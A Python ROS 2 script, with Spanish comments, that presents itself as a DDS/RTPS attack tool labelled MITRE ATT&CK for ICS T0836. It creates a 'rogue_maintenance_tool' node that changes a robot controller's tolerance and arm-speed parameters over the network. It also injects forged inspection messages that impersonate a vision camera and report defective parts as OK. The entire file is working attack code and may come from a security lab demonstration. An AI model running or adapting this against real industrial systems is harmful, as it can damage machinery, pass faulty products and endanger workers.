#!/usr/bin/env python3

import argparse
import json
import time
from datetime import datetime, timezone

import rclpy
from rcl_interfaces.msg import Parameter, ParameterType, ParameterValue
from rcl_interfaces.srv import SetParameters
from rclpy.node import Node
from std_msgs.msg import String


class DDSAttackerNode(Node):
    def __init__(self):
        super().__init__("rogue_maintenance_tool")
        self.spoof_pub = self.create_publisher(String, "/inspection/piece_status", 10)
        self.param_client = self.create_client(
            SetParameters, "/robot_controller/set_parameters"
        )

    def modify_robot_parameters(self, new_tolerance_mm: float = 10.0, new_speed_pct: int = 100):
        self.get_logger().warning(
            f"[ATAQUE T0836 - Modify Parameter] Conectando a /robot_controller/set_parameters..."
        )
        if not self.param_client.wait_for_service(timeout_sec=5.0):
            self.get_logger().error(
                "Servicio /robot_controller/set_parameters no disponible (¿SROS2 activo?)."
            )
            return False

        req = SetParameters.Request()

        p_tol = Parameter()
        p_tol.name = "max_tolerance_mm"
        p_tol.value = ParameterValue(
            type=ParameterType.PARAMETER_DOUBLE,
            double_value=float(new_tolerance_mm),
        )

        p_spd = Parameter()
        p_spd.name = "arm_speed_pct"
        p_spd.value = ParameterValue(
            type=ParameterType.PARAMETER_INTEGER,
            integer_value=int(new_speed_pct),
        )

        req.parameters = [p_tol, p_spd]
        future = self.param_client.call_async(req)
        rclpy.spin_until_future_complete(self, future, timeout_sec=5.0)

        if future.result() is not None:
            self.get_logger().warning(
                f"💥 [ÉXITO T0836] Parámetros del robot modificados remotamente: "
                f"max_tolerance_mm={new_tolerance_mm}mm, arm_speed_pct={new_speed_pct}%"
            )
            return True
        else:
            self.get_logger().error("Fallo al modificar parámetros del robot.")
            return False

    def inject_spoofed_inspection(self, count: int = 3):
        self.get_logger().warning(
            "[ATAQUE SPOOFING DDS] Inyectando resultados falsos en /inspection/piece_status..."
        )
        time.sleep(1.5)

        for i in range(1, count + 1):
            fake_piece_id = f"P-FAKE-90{i}"
            spoofed_payload = {
                "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
                "source_node": "CAM-VISION-01",  # Suplantamos la identidad lógica de la cámara
                "piece_id": fake_piece_id,
                "quality_status": "OK",          # Falsificado: pieza rota reportada como OK
                "defect_mm": 0.05,               # Falsificado (real: >2.45mm)
                "tolerance_mm": 0.50,
                "defect_type": "SPOOFED_BY_ATTACKER",
                "recommended_action": "PALLETIZE",
            }
            msg = String()
            msg.data = json.dumps(spoofed_payload)
            self.spoof_pub.publish(msg)
            self.get_logger().warning(
                f"💉 [PAQUETE RTPS INYECTADO] Pieza={fake_piece_id} -> "
                f"Falsificada como OK (0.05mm) suplantando a CAM-VISION-01"
            )
            time.sleep(1.0)


def main():
    parser = argparse.ArgumentParser(description="Script de ataque DDS/RTPS (MITRE T0836)")
    parser.add_argument(
        "--mode",
        choices=["all", "spoof", "param"],
        default="all",
        help="Modo de ataque: 'param' (T0836 Modify Parameter), 'spoof' (Inyección de topic), 'all' (ambos)",
    )
    parser.add_argument(
        "--tolerance",
        type=float,
        default=10.0,
        help="Nuevo valor de max_tolerance_mm a inyectar en el robot (default: 10.0 mm)",
    )
    args = parser.parse_args()

    rclpy.init()
    attacker = DDSAttackerNode()
    try:
        if args.mode in ("param", "all"):
            attacker.modify_robot_parameters(new_tolerance_mm=args.tolerance, new_speed_pct=100)
        if args.mode in ("spoof", "all"):
            attacker.inject_spoofed_inspection(count=3)
    finally:
        attacker.destroy_node()
        rclpy.shutdown()


if __name__ == "__main__":
    main()
